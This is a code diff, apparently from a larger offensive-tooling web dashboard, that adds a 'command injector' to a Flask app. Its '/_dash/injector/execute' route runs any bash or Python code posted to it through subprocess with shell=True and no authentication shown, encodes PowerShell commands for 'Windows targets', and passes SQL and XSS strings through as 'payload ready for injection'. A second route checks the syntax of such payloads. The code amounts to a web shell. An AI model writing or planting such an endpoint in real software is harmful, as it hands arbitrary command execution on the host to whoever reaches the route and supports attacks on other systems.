@@ -4817,6 +4817,127 @@ def get_exploit_info():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
+# ========== COMMAND INJECTOR ROUTES ==========
+
+@app.route('/_dash/injector/execute', methods=['POST'])
+def execute_injection():
+    """Execute injected code"""
+    import subprocess
+    import tempfile
+    
+    data = request.json or {}
+    code = data.get('code', '')
+    code_type = data.get('type', 'bash')
+    
+    if not code:
+        return jsonify({'success': False, 'error': 'No code provided'})
+    
+    try:
+        if code_type in ['bash', 'cmd']:
+            # Execute bash/shell command
+            result = subprocess.run(
+                code,
+                shell=True,
+                capture_output=True,
+                text=True,
+                timeout=30
+            )
+            return jsonify({
+                'success': result.returncode == 0,
+                'output': result.stdout + result.stderr,
+                'return_code': result.returncode
+            })
+        
+        elif code_type == 'python':
+            # Execute Python code
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
+                f.write(code)
+                f.flush()
+                result = subprocess.run(
+                    ['python3', f.name],
+                    capture_output=True,
+                    text=True,
+                    timeout=30
+                )
+                os.unlink(f.name)
+                return jsonify({
+                    'success': result.returncode == 0,
+                    'output': result.stdout + result.stderr,
+                    'return_code': result.returncode
+                })
+        
+        elif code_type == 'powershell':
+            # Just return the encoded version for Windows targets
+            import base64
+            encoded = base64.b64encode(code.encode('utf-16le')).decode()
+            return jsonify({
+                'success': True,
+                'output': f'PowerShell command ready:\npowershell -enc {encoded}',
+                'encoded': encoded
+            })
+        
+        elif code_type in ['sql', 'xss']:
+            # These are payloads to be used elsewhere, just validate
+            return jsonify({
+                'success': True,
+                'output': f'{code_type.upper()} payload ready for injection.\nLength: {len(code)} chars',
+                'payload': code
+            })
+        
+        else:
+            return jsonify({'success': False, 'error': f'Unknown type: {code_type}'})
+    
+    except subprocess.TimeoutExpired:
+        return jsonify({'success': False, 'error': 'Execution timed out (30s limit)'})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/_dash/injector/test', methods=['POST'])
+def test_injection():
+    """Test injection syntax"""
+    import subprocess
+    
+    data = request.json or {}
+    code = data.get('code', '')
+    code_type = data.get('type', 'bash')
+    
+    if not code:
+        return jsonify({'valid': False, 'error': 'No code provided'})
+    
+    try:
+        if code_type in ['bash', 'cmd']:
+            # Check bash syntax
+            result = subprocess.run(
+                ['bash', '-n', '-c', code],
+                capture_output=True,
+                text=True,
+                timeout=5
+            )
+            return jsonify({
+                'valid': result.returncode == 0,
+                'message': 'Bash syntax valid' if result.returncode == 0 else result.stderr
+            })
+        
+        elif code_type == 'python':
+            # Check Python syntax
+            try:
+                compile(code, '<string>', 'exec')
+                return jsonify({'valid': True, 'message': 'Python syntax valid'})
+            except SyntaxError as e:
+                return jsonify({'valid': False, 'error': f'Line {e.lineno}: {e.msg}'})
+        
+        elif code_type in ['sql', 'xss', 'powershell']:
+            # Basic validation
+            return jsonify({
+                'valid': len(code) > 0,
+                'message': f'{code_type.upper()} payload looks valid ({len(code)} chars)'
+            })
+        
+        return jsonify({'valid': True, 'message': 'Syntax check passed'})
+    
+    except Exception as e:
+        return jsonify({'valid': False, 'error': str(e)})
+
 @app.route('/_dash/network/capture/stop', methods=['POST'])
 def stop_network_capture():
     """Stop packet capture"""
